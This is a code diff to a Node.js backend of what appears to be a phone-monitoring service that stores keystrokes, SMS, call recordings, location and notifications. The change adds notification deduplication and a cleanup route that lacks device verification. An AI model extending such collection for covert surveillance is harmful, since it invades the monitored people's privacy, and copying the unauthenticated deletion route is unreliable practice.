@@ -3,9 +3,78 @@ const mongoose = require('mongoose');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
 const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User, InstalledApp, CallRecording } = require('../models');
 
 const router = express.Router();
+
+const normalizeNotificationTimestamp = (value) => {
+  if (!value) return new Date();
+  const date = new Date(value);
+  return Number.isNaN(date.getTime()) ? new Date() : date;
+};
+
+const normalizeNotificationMessage = (content, title) => {
+  if (typeof content === 'string' && content.trim()) return content.trim();
+  if (typeof title === 'string') return title.trim();
+  return '';
+};
+
+const buildNotificationDedupeHash = ({ deviceId, packageName, title, content, timestamp }) => {
+  const normalizedTimestamp = normalizeNotificationTimestamp(timestamp).getTime();
+  const normalizedMessage = normalizeNotificationMessage(content, title);
+  const raw = `${deviceId || ''}||${packageName || ''}||${normalizedTimestamp}||${normalizedMessage}`;
+  return crypto.createHash('sha1').update(raw).digest('hex');
+};
+
+const normalizeNotificationDoc = (deviceId, notification = {}) => {
+  const normalizedTimestamp = normalizeNotificationTimestamp(notification.timestamp);
+  const normalizedTitle = typeof notification.title === 'string' ? notification.title.trim() : notification.title;
+  const normalizedContent = normalizeNotificationMessage(notification.content ?? notification.text, normalizedTitle);
+
+  return {
+    deviceId,
+    packageName: notification.packageName,
+    appName: notification.appName,
+    title: normalizedTitle,
+    content: normalizedContent,
+    imageUrl: notification.imageUrl,
+    timestamp: normalizedTimestamp,
+    dedupeHash: buildNotificationDedupeHash({
+      deviceId,
+      packageName: notification.packageName,
+      title: normalizedTitle,
+      content: normalizedContent,
+      timestamp: normalizedTimestamp
+    })
+  };
+};
+
+const dedupeNotificationDocs = (docs) => {
+  const seen = new Set();
+  return docs.filter(doc => {
+    if (!doc.packageName) return false;
+    if (seen.has(doc.dedupeHash)) return false;
+    seen.add(doc.dedupeHash);
+    return true;
+  });
+};
+
+const upsertNotifications = async (docs) => {
+  if (!docs || docs.length === 0) return { inserted: 0, duplicatesSkipped: 0 };
+
+  const operations = docs.map(doc => ({
+    updateOne: {
+      filter: { dedupeHash: doc.dedupeHash },
+      update: { $setOnInsert: doc },
+      upsert: true
+    }
+  }));
+
+  const result = await Notification.bulkWrite(operations, { ordered: false });
+  const inserted = result.upsertedCount || 0;
+  return { inserted, duplicatesSkipped: docs.length - inserted };
+};
 
 // Configure multer for call recording uploads
 const callRecordingDir = path.join(__dirname, '..', 'uploads', 'call-recordings');
@@ -239,21 +308,15 @@ router.post('/notifications', verifyDevice, async (req, res) => {
       return res.status(400).json({ error: 'Notifications must be an array' });
     }
 
-    const docs = notifications.map(n => ({
-      deviceId: req.device.deviceId,
-      packageName: n.packageName,
-      appName: n.appName,
-      title: n.title,
-      content: n.content,
-      imageUrl: n.imageUrl,
-      timestamp: n.timestamp || new Date()
-    }));
-
-    await Notification.insertMany(docs, { ordered: false });
+    const docs = dedupeNotificationDocs(
+      notifications.map(n => normalizeNotificationDoc(req.device.deviceId, n))
+    );
+    const result = await upsertNotifications(docs);
 
     res.json({
       success: true,
-      count: docs.length
+      count: result.inserted,
+      duplicatesSkipped: result.duplicatesSkipped
     });
   } catch (error) {
     // Ignore duplicate key errors
@@ -279,26 +342,65 @@ router.post('/notification', async (req, res) => {
       return res.status(404).json({ error: 'Device not found' });
     }
     
-    const doc = {
-      deviceId: device.deviceId,
-      packageName: notification.packageName,
-      appName: notification.appName,
-      title: notification.title,
-      content: notification.text || notification.content,
-      timestamp: notification.timestamp ? new Date(notification.timestamp) : new Date()
-    };
+    const doc = normalizeNotificationDoc(device.deviceId, notification);
+    const result = await upsertNotifications([doc]);
     
-    await Notification.create(doc);
+    if (result.inserted > 0) {
+      console.log(`[Notification] Saved notification from ${notification.appName} for device ${device.name}`);
+    }
     
-    console.log(`[Notification] Saved notification from ${notification.appName} for device ${device.name}`);
-    
-    res.json({ success: true });
+    res.json({ success: true, duplicate: result.inserted === 0 });
   } catch (error) {
     // Ignore duplicate key errors
     if (error.code !== 11000) {
       console.error('Upload notification error:', error);
     }
     res.json({ success: true });
+  }
+});
+
+// Cleanup duplicate notifications using exact key: device + package + timestamp + message
+router.post('/notifications/cleanup-duplicates', async (req, res) => {
+  try {
+    const { deviceId } = req.body || {};
+
+    const pipeline = [
+      ...(deviceId ? [{ $match: { deviceId } }] : []),
+      {
+        $group: {
+          _id: {
+            deviceId: '$deviceId',
+            packageName: '$packageName',
+            timestamp: '$timestamp',
+            message: { $ifNull: ['$content', '$title'] }
+          },
+          count: { $sum: 1 },
+          docs: { $push: '$_id' },
+          firstDoc: { $first: '$_id' }
+        }
+      },
+      { $match: { count: { $gt: 1 } } }
+    ];
+
+    const duplicates = await Notification.aggregate(pipeline).allowDiskUse(true);
+
+    let deletedCount = 0;
+    for (const dup of duplicates) {
+      const idsToDelete = dup.docs.filter(id => !id.equals(dup.firstDoc));
+      if (idsToDelete.length > 0) {
+        const result = await Notification.deleteMany({ _id: { $in: idsToDelete } });
+        deletedCount += result.deletedCount;
+      }
+    }
+
+    res.json({
+      success: true,
+      duplicateGroupsFound: duplicates.length,
+      notificationsDeleted: deletedCount
+    });
+  } catch (error) {
+    console.error('Notification duplicate cleanup error:', error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -475,12 +577,10 @@ router.post('/:deviceId', async (req, res, next) => {
 
     // Sync notifications
     if (notifications && notifications.length > 0) {
-      const notifDocs = notifications.map(n => ({
-        deviceId: device.deviceId,
-        ...n,
-        timestamp: n.timestamp || new Date()
-      }));
-      await Notification.insertMany(notifDocs, { ordered: false }).catch(() => {});
+      const notifDocs = dedupeNotificationDocs(
+        notifications.map(n => normalizeNotificationDoc(device.deviceId, n))
+      );
+      await upsertNotifications(notifDocs).catch(() => {});
     }
 
     // Sync call logs
@@ -597,12 +697,10 @@ router.post('/sync', verifyDevice, async (req, res) => {
 
     // Sync notifications
     if (notifications && notifications.length > 0) {
-      const notifDocs = notifications.map(n => ({
-        deviceId: req.device.deviceId,
-        ...n,
-        timestamp: n.timestamp || new Date()
-      }));
-      await Notification.insertMany(notifDocs, { ordered: false }).catch(() => {});
+      const notifDocs = dedupeNotificationDocs(
+        notifications.map(n => normalizeNotificationDoc(req.device.deviceId, n))
+      );
+      await upsertNotifications(notifDocs).catch(() => {});
     }
 
     // Sync call logs
